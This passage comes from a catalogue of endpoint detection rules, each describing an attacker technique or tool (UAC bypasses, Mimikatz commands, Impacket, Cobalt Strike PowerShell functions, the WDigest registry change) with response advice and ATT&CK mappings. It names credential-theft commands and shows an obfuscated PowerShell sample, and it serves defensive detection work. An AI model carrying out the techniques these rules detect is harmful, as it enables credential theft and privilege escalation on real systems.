This detection identifies the use of ‘SndVol.exe’, which will automatically run with elevated privileges when using a crafted application compatibility shim. A malicious actor could use this auto-elevated binary to bypass the Microsoft Windows User Account Control prompt and inherit its elevated privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - UAC Bypass Using SystemProperties Windows Binaries</summary>



#### Description

This detection identifies the use of ‘SystemPropertiesAdvanced.exe’, and four other SystemProperties Windows binaries, which will automatically run with elevated privileges. When executed, these binaries search in a user-writable location for a DLL to load. A malicious actor could use these auto-elevated binaries to bypass the Microsoft Windows User Account Control prompt and inherit its elevated privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - UAC Bypass Using WSReset</summary>



#### Description

This detection identifies the use of the Windows system binary ‘wsreset.exe’, which will automatically run with elevated privileges.This Windows system binary searches for a user-writable location in the registry for a command to run. A malicious actor could use this binary to bypass the Microsoft Windows User Account Control prompt and inherit its elevated privileges.

#### Recommendation

Investigate any child processes of ‘wsreset.exe’ to determine if it is authorized and expected. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - Uninstall Symantec Endpoint Detection With MSIExec</summary>



#### Description

This detection identifies the uninstallation of software using 'msiexec.exe' with the flag of '/x' where the unique ID being targeted is for Symantec Endpoint Protection. This technique has been observed in use by malicious actors in order to remove security monitoring software from the remote system.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password. 

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Msiexec - T1218.007
- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Technique - URL Passed To BitsAdmin</summary>



#### Description

This detection identifies a URL being passed to the 'bitsadmin.exe' binary to cause a file to download to the endpoint using the Background Intelligent Transfer Service. This technique is used by malicious actors to retrieve malware to a compromised endpoint for execution. It is commonly seen with malicious document-related activity.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- BITS Jobs - T1197
- User Execution - T1204
- Phishing - T1566
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Attacker Technique - WDigest UseLogonCredential Enabled</summary>



#### Description

The Wdigest protocol sends credentials in plaintext and stores them in memory. These credentials can be extracted using tools like Mimikatz.

Storing the credentials in memory can be disabled by setting UseLogonCredential to 0 in the  HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest registry key. Attackers have been observed in the wild changing this value to 1 in order to re-enable this behavior and steal credentials.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Attacker Technique - Werfault Executed Without Standard Command Line Arguments</summary>



#### Description

This detection identifies 'rundll32.exe' spawning a child process of 'werfault.exe' without the standard command line arguments being passed to it. This technique is used by malicious actors in order to inject code of their choice for execution while appearing to the operating system to be a standard binary that is invoked automatically when a process crashes on Windows.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Match Legitimate Name or Location - T1036.005
- Process Injection - T1055


</details>



<details>
<summary>Attacker Technique - Windows Backup Admin Deletes Backup</summary>



#### Description

This detection identifies the Windows Backup Admin utility being used to delete backups. This behavior is commonly observed in ransomware, which will delete backups to prevent system recovery. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Inhibit System Recovery - T1490


</details>



<details>
<summary>Attacker Technique - WMIC Creating CMD Process</summary>



#### Description

WMIC.exe, the command line utility for Windows Managent Instrumentation, has a number of functions that may be abused by an attacker. This detection identifies attempted creation of a PowerShell or cmd.exe process by WMIC.

#### Recommendation

Analyze WMIC's command line arguments to determine if the command is expected behavior, or if it contains any suspicious indicators like obfuscated PowerShell commands. Investigate parent and child processes. 

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Attacker Technique - WMIC Creating Process</summary>



#### Description

WMIC.exe, the command line utility for Windows Managent Instrumentation, has a number of functions that may be abused by an attacker. This detection identifies attempted creation of a process by WMIC.

#### Recommendation

Analyze WMIC's command line arguments to determine if the command is expected behavior, or if it contains any suspicious indicators like obfuscated PowerShell commands. Investigate parent and child processes. 

#### MITRE ATT&CK Techniques

- Windows Remote Management - T1021.006
- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Attacker Technique - WMIPrvSE Spawns MSBuild</summary>



#### Description

This detection identifies 'WMIPrvSe.exe' spawning 'MSBuild.exe'. This technique is used by malicious actors to proxy execution of the 'MSBuild.exe' to compile and execute malicious code. This has been observed in the wild as post compromise activity by malicious actors compiling and executing Cobalt Strike.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Compile After Delivery - T1027.004
- Trusted Developer Utilities Proxy Execution - T1127


</details>



<details>
<summary>Attacker Technique - WUSA With Extract Flag</summary>



#### Description

This detection identifies the ‘wusa.exe’ binary being used with the ‘extract’ flag. Malicious actors use this technique to perform a user account control bypass using ‘sysprep.exe’.


#### Recommendation

Investigate surrounding activity to determine if ‘sysprep.exe’ was run shortly after the ‘wusa.exe’ extraction command. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - XSL Script Processing With WMIC</summary>



#### Description

This detection identifies ‘*.XSL’ (eXtensible Stylesheet Language) scripts being passed locally or from a URL to ‘WMIC.exe’ to bypass application whitelisting. This technique is used by malicious actors and penetration testers to execute these scripts through the ‘WMIC.exe’ binary.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- XSL Script Processing - T1220


</details>



<details>
<summary>Attacker Teqhnique - DLL Injection via Tracker</summary>



#### Description

This detection identifies processes spawned by ‘tracker.exe’. This technique is used by malicious actors to bypass Microsoft AppLocker, which can be used to inject ‘.dll’ files into processes.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Dynamic-link Library Injection - T1055.001


</details>



<details>
<summary>Attacker Tool - ADCollector</summary>



#### Description

This detection identifies the use of ADCollector. ADCollector is a tool for enumerating Active Directory environments to identify possible attack vectors.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Permission Groups Discovery - T1069


</details>



<details>
<summary>Attacker Tool - ADPassHunt</summary>



#### Description

This detection identifies that the 'ADPassHunt.exe' tool has been used by a malicious actor or penetration tester in the environment. ADPassHunt is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Advanced IP Scanner</summary>



#### Description

This detection identifies the use of the Advanced IP Scanner tool, a network utility that has been used by malicious actors when deploying ransomware.

#### Recommendation

Determine whether this activity is authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Network Service Scanning - T1046


</details>



<details>
<summary>Attacker Tool - Advanced Port Scanner</summary>



#### Description

This detection identifies the use of the Advanced Port Scanner tool. Advanced Port Scanner may be used by malicious actors for network discovery purposes. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Attacker Tool - AdvancedRun</summary>



#### Description

This detection identifies the execution of legitimate Windows tool AdvancedRun, which allows a user to run a program with additional options than those that are normally available in Windows. This tool is has been observed in use by malicious actors in the Whispergate campaign to stop and delete Windows Defender. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Tool - Ammyy Admin</summary>



#### Description

This detection identifies the Remote Access Tool (RAT) 'Ammyy Admin' being executed. This tool is often used by malicious actors after a compromise to interact with the compromised endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Attacker Tool - Antivirus-Disabling Utility</summary>



#### Description

This detection identifies numerous tools that can be used to disable Windows antivirus capabilities. 

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Tool - Binary Metadata Matches PowerShdll</summary>



#### Description

This detection identifies PowerShdll being executed. PowerShdll is a method of running PowerShell commands by loading a DLL rather than running the ‘PowerShell.exe’ executable. It can be loaded with several built-in Windows utilities, including ‘rundll32.exe’, ‘regasm.exe’, ‘regsvcs.exe’, ‘InstallUtil.exe’, ‘regsvr32.exe’. It can also be run as a stand-alone executable. The code for PowerShdll can be found at https://github.com/p3nt4/PowerShdll.

#### Recommendation

Examine the commands passed to the PowerShdll executable. 

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Signed Binary Proxy Execution - T1218
- Regsvr32 - T1218.010
- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Tool - Bloodhound</summary>



#### Description

This detection identifies the use of the tool Bloodhound by a malicious actor or penetration tester in the environment. Bloodhound is used to map Active Directory environments and could assist a malicious actor with lateral movement.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - CHAOS Remote Access Tool (RAT)</summary>



#### Description

This detection identifies the use of CHAOS RAT by malicious actors or penetration testers to maintain access to a compromised endpoint. CHAOS RAT is an open source project, which has features, such as keylogging, screenshotting, file transfer to and from the host, and persistence mechanisms that allow it to remain active through a reboot. It also supports common Operating Systems, such as Microsoft Windows, Linux, and MacOS.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Malware - T1588.001


</details>



<details>
<summary>Attacker Tool - CobaltStrike PowerShell Commands</summary>



#### Description

This detection identifies commands common to CobaltStrike's PowerShell payload. These commands include "Get-GPPPassword", "Invoke-AllChecks", "Invoke-BloodHound", "Invoke-EternalBlue", "Invoke-FileFinder", "Invoke-HostRecon", "Invoke-Inveigh", "Invoke-Kerberoast", "Invoke-LoginPrompt", "Invoke-mimikittenz", "Invoke-ShareFinder"," and Invoke-UserHunter".

#### Recommendation

Determine whether this is part of authorized testing activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - Default Empire Scheduled Task Names</summary>



#### Description

This detection identifies the default scheduled task names used by the PowerShell Empire framework.

#### Recommendation

Examine the contents of the scheduled task and determine whether or not this is normal authorized activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - Direct HTTP Tunnel</summary>



#### Description

This detection identifies that  the‘Direct HTTP Tunnel.exe' tool has been used by a malicious actor or penetration tester in the environment. Direct HTTP Tunnel  is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - DomainPasswordSpray</summary>



#### Description

This detection identifies the use of the tool DomainPasswordSpray by a malicious actor in the environment. DomainPasswordSpray is a PowerShell-based tool used by malicious actors and penetration testers to perform password spray attacks. This open source tool is available on GitHub at ‘https://github.com/dafthack/DomainPasswordSpray’.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Brute Force - T1110
- Password Spraying - T1110.003
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Dotnetcat</summary>



#### Description

This detection identifies the execution of the attacker tool known as 'Dotnetcat'. This tool is used by malicious actors to transmit data between systems.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over Alternative Protocol - T1048
- Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol - T1048.003
- Lateral Tool Transfer - T1570


</details>



<details>
<summary>Attacker Tool - DumpCreds or DumpCerts Appears in PowerShell Command Line</summary>



#### Description

This detection identifies the use of the parameters ‘DumpCreds’ or ‘DumpCerts’, which are passed to the PowerShell version of Mimikatz, ‘Invoke-Mimikatz.ps1’. These parameters dump credentials out of the ‘LSASS.exe’ process and export all private certificates respectively. This tool and technique are used by malicious actors and penetration testers to acquire additional credentials and certificates from a target.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Eldos Raw Disk Driver</summary>



#### Description

This detection identifies the use of the Eldos Raw Disk Driver. This tool is used by malicious actors, such as Shamoon, to erase the contents of a disk.

#### Recommendation

Determine whether this activity is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Data Destruction - T1485


</details>



<details>
<summary>Attacker Tool - Excavator</summary>



#### Description

This detection identifies the use of the tool Excavator, which is used for process dumping. Excavator is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - FFLanProxy</summary>



#### Description

This detection identifies use of FFLanProxy. FFLanProxy is a cross-platform proxy tool observed in use by malicious actors. 


#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Proxy - T1090


</details>



<details>
<summary>Attacker Tool - FireEye Stolen Tools</summary>



#### Description

This detection identifies the hashes disclosed by FireEye as part of their breach announced in December 2020. These hashes correspond to a number of internally-developed FireEye tools. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password. Compare the hash of the detected file against the list of hashes provided by FireEye on their GitHub to determine the nature of the detected tool.
https://github.com/fireeye/red_team_tool_countermeasures/blob/master/all-yara.yar


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - GadgetToJScript</summary>



#### Description

This detection identifies that the ‘GadgetToJScript.exe' tool has been used by a malicious actor or penetration tester in the environment. GadgetToJScript is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - GetShell</summary>



#### Description

This detection identifies the 'GetShell.exe' tool being executed. This tool is used to get an interactive shell on a system, and was observed being dropped by malicious actors following the compromise of web servers.


#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059


</details>



<details>
<summary>Attacker Tool - Hashcat</summary>



#### Description

This detection identifies the use of the tool hashcat, which is used by malicious actors and penetration testers to dump credentials and recover passwords.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Brute Force - T1110
- Password Cracking - T1110.002
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - HiveNightmare</summary>



#### Description

This detection identifies the use of a utility that exploits the HiveNightmare vulnerability, CVE-2021–36934. This vulnerability allows any user to read the contents of any registry regardless of whether they are an administrator. A malicious actor may use this to copy the SAM hive and extract passwords.

#### Recommendation

Determine whether or not this is part of authorized testing. If not, examine the parent process that spawned the process in question, and any process that it may have spawned. Consider rebuilding the host from a known, good source and resetting the passwords of all users on the system. 

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Attacker Tool - HTran Command Line Flags</summary>



#### Description

This detection identifies the presence of flags associated with the HTran tool, which is used by malicious actors to create a reverse proxy on a compromised system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Proxy - T1090


</details>



<details>
<summary>Attacker Tool - Impacket</summary>



#### Description

This detection identifies the use of commands structured consistent with the tool Impacket. In particular, output files with names containing '__output'. Impacket is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. Impacket is used by malicious actors and penetration testers to perform  remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Impacket Lateral Movement</summary>



#### Description

This detection identifies command line signifiers of lateral movement being performed by the Impacket toolset. Penetration testers and Malicious actors use the Impacket toolset to move laterally using Windows Remote Management, DCOM objects, or SMB.


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Remote Services - T1021
- SMB/Windows Admin Shares - T1021.002
- Distributed Component Object Model - T1021.003
- Windows Remote Management - T1021.006


</details>



<details>
<summary>Attacker Tool - Impacket-Obfuscation</summary>



#### Description

This detection identifies common elements of commands related to Impacket-Obfuscation, which is an obfuscated version of the open source Impacket framework that is used for SMB and WMI lateral movement and execution. Impacket-Obfuscation is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Data Obfuscation - T1001
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Interceptor-NG</summary>



#### Description

This detection identifies use of Interceptor-NG. Interceptor-NG is a network sniffing and traffic interception tool that has been employed by malicious actors.

#### Recommendation

Determine if this is a part of authorized testing. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Network Sniffing - T1040
- Adversary-in-the-Middle - T1557


</details>



<details>
<summary>Attacker Tool - Inveigh</summary>



#### Description

This detection identifies that the ‘Inveigh.exe' tool has been used by a malicious actor or penetration tester in the environment. Inveigh is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Inveigh Output Filename Seen On Command Line</summary>



#### Description

This detection identifies the default filenames of ‘Inveigh.ps1’, which is a tool used by penetration testers and malicious actors to perform spoofing and Man-in-the-Middle attacks. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Adversary-in-the-Middle - T1557
- LLMNR/NBT-NS Poisoning and SMB Relay - T1557.001


</details>



<details>
<summary>Attacker Tool - Invoke-Inveigh PowerShell Function</summary>



#### Description

This detection identifies the ‘Invoke-Inveigh’ function being called  from ‘Inveigh.ps1’ as it is passed to ‘PowerShell.exe’. This tool is a packet sniffer written in .net and used by malicious actors to spoof responses to multiple naming services to perform Man-in-the-Middle attacks. This technique is used by malicious actors and penetration testers in conjunction with a PowerShell download cradle.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Network Sniffing - T1040
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Adversary-in-the-Middle - T1557
- LLMNR/NBT-NS Poisoning and SMB Relay - T1557.001
- Data Manipulation - T1565
- Transmitted Data Manipulation - T1565.002
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Invoke-TheHash</summary>



#### Description

This detection identifies execution of Invoke-TheHash, a set of PowerShell scripts intended for Pass-The-Hash attacks.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Pass the Hash - T1550.002


</details>



<details>
<summary>Attacker Tool - IObit Unlocker</summary>



#### Description

This detection identifies suspicious use of the IObit Unlocker utility. This legitimate utility is designed to allow access to files that are otherwise locked by the filesystem. Malicious actors may do this to gain access to files in use so that they can be encrypted.

#### Recommendation

Examine the parent process that spawned IObit Unlocker. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


</details>



<details>
<summary>Attacker Tool - John The Ripper</summary>



#### Description

This detection identifies the use of the password cracking tool John The Ripper (john.exe).

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this was behavior was part of any authorized security-related activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Password Cracking - T1110.002


</details>



<details>
<summary>Attacker Tool - Koadic WMI Event Filter and Consumer Binding</summary>



#### Description

This detection identifies a WMI event filter to consumer binding with the name equal to ‘K0adic’ within ‘wmic.exe’ process events. This activity is consistent with the presence of the Koadic backdoor frameworks WMI persistence mechanism in a default configuration.

#### Recommendation

Investigate the parent or child process of the ‘wmic.exe’ process to determine if the activity is authorized and expected within the environment. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Event Triggered Execution - T1546
- Windows Management Instrumentation Event Subscription - T1546.003
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - KWorking\agent.exe</summary>



#### Description

This detection identifies a binary named 'agent.exe' being run out of a directory called KWorking or Avtex. This activity was observed in a July 2021 supply chain compromise of the Kaseya remote management software in which ransomware was deployed to this location. 

#### Recommendation

Investigate the 'agent.exe' binary. Review any activity launched by the Kaseya agent 'AgentMon.exe'. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password. Also consider disabling Kaseya environment-wide until the hosts that use it can be reviewed for suspicious activity. 

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Attacker Tool - LaZagne</summary>



#### Description

This detection identifies common command line flags used with the LaZagne password extraction tool.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this was behavior was part of any authorized security-related activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Unsecured Credentials - T1552


</details>



<details>
<summary>Attacker Tool - LNKSmasher</summary>



#### Description

This detection identifies payloads generated with LNKSmasher. LNKSmasher is a tool that was stolen by a malicious actor from FireEye.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Attacker Tool - Metasploit String Literal Obfuscation</summary>



#### Description

This detection identifies PowerShell obfuscation implemented by Metasploit. Obfuscation is intended to break up strings in PowerShell commands to make detection more difficult. The obfuscation will appear similar to this:
"((''+'{0}c{4'+'}'+'i{'+'3}{'+'7}'+'{5'+'}'+'{'+'8'+'}'+'oc'+'{'+'6'+'}{2}'+'ogg'+'i{'+'1'+'}g'+'')-f'S','n','L','p','r','B','k','t','l')"

#### Recommendation

Attempt to reverse the obfuscation and identify the original PowerShell command. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - Meterpreter/Cobalt Strike GetSystem</summary>



#### Description

This detection identifies the commandline activity that occurs when the GetSystem function from Meterpreter or Cobalt Strike is used.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Attacker Tool - MimiKatz</summary>



#### Description

This detection identifies possible instances of the Mimikatz credential theft tool based on the command line arguments and the binary metadata. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this was behavior was part of any authorized security-related activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Security Account Manager - T1003.002
- LSA Secrets - T1003.004
- DCSync - T1003.006
- Credentials from Web Browsers - T1555.003
- Windows Credential Manager - T1555.004


</details>



<details>
<summary>Attacker Tool - Mimikatz AddSid</summary>



#### Description

This detection identifies use of the Mimikatz AddSid module. A SID is a Windows security identifier, which identifies a windows user or account. The AddSid module modifies an account's SidHistory to associate a new SID with that account, which can allow impersonation of users or groups. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- SID-History Injection - T1134.005


</details>



<details>
<summary>Attacker Tool - MimiKatz Command sekurlsa In Command Line</summary>



#### Description

This detection identifies the use of the tool Mimikatz by a malicious actor or penetration tester in the environment. Mimikatz uses the command ‘sekurlsa’, which extracts passwords, keys, pin codes, and tickets from the memory of the ‘LSASS.exe’ process. This technique is used by malicious actors and penetration testers to acquire additional credentials from a target user.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Mimikatz Command token::elevate lsadump</summary>



#### Description

This detection identifies the use of the tool Mimikatz by a malicious actor or penetration tester. Mimikatz uses the command ‘token::elevate’, which impersonates the SYSTEM-level token to find and use the Domain Administrator’s token on the host. The command ‘lsadump’ uses several methods to retrieve and dump the credentials. This tool and technique are used by malicious actors and penetration testers to acquire additional credentials from a target.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Mimikatz Module Names</summary>



#### Description

This detection identifies various Mimikatz modules, a popular credential theft tool.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Security Account Manager - T1003.002
- LSA Secrets - T1003.004
- DCSync - T1003.006
- Credentials from Web Browsers - T1555.003
- Windows Credential Manager - T1555.004


</details>



<details>
<summary>Attacker Tool - MimiKatz RegASM</summary>



#### Description

This detection identifies the use of the tool Mimikatz by a malicious actor or penetration tester in the environment, specifically for ‘regasm.exe’. Mimikatz uses the command ‘sekurlsa’, which extracts passwords, keys, pin codes, and tickets from the memory of the ‘LSASS.exe’ process. This technique is used by malicious actors and penetration testers to acquire additional credentials from a target user.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
